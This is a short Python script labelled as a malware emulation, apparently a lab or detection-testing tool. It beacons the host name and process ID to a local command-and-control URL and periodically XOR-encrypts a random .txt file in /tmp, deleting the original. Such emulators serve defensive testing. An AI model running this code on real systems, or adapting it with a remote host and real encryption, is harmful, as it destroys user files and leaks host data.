#!/usr/bin/env python3
"""
Active Malware Payload (Emulation)
- Connects to local 'C2' (Heartbeat file)
- Scans for target files
- Exfiltrates data
"""

import os
import time
import sys
import random
import uuid
import urllib.request

# Configuration
C2_URL = "http://127.0.0.1:8888"
TARGET_DIR = "/tmp"

def beacon():
    """Send heartbeat to C2 via Network"""
    try:
        data = f"BEACON | PID:{os.getpid()} | HOST:{os.uname().nodename}".encode('utf-8')
        req = urllib.request.Request(f"{C2_URL}/beacon", data=data)
        with urllib.request.urlopen(req) as f: pass
    except: pass

def encrypt_user_files():
    """Finds a random .txt file and 'encrypts' it"""
    try:
        targets = []
        with os.scandir(TARGET_DIR) as entries:
            for entry in entries:
                if entry.is_file() and entry.name.endswith(".txt") and "malware" not in entry.name:
                    targets.append(entry.path)

        if targets:
            t = random.choice(targets)
            with open(t, "rb") as f: data = f.read()
            encrypted = bytearray([b ^ 0xFF for b in data])
            with open(t + ".enc", "wb") as f: f.write(encrypted)
            os.remove(t)
    except: pass

def main():
    # Main Loop
    while True:
        beacon()

        if random.random() < 0.1:
            encrypt_user_files()

        time.sleep(2)

if __name__ == "__main__":
    # Daemonize (Simulated by just running loop)
    main()
